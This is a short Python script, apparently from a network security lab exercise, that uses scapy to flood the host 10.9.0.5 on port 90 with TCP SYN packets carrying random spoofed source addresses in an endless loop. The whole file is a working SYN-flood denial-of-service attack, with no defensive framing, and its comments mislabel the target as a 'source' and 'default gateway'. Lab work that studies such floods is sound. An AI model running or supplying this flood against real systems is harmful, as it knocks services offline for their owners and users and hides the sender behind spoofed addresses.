from scapy.all import *

#default gateway IP
source_ip ="10.9.0.5"

#http port
source_port = 90

def synFloodAttack(source_ip, sport, dport):
    source_addr = RandIP()   #random Ip address
    pkt =IP(src= source_addr, dst= source_ip)/ TCP(sport =sport, dport=dport, seq= 1505066, flags="S")
    send(pkt)

while True:
    #type CTRL +C to stop the SYN pkt
    synFloodAttack(source_ip, 1234 , source_port )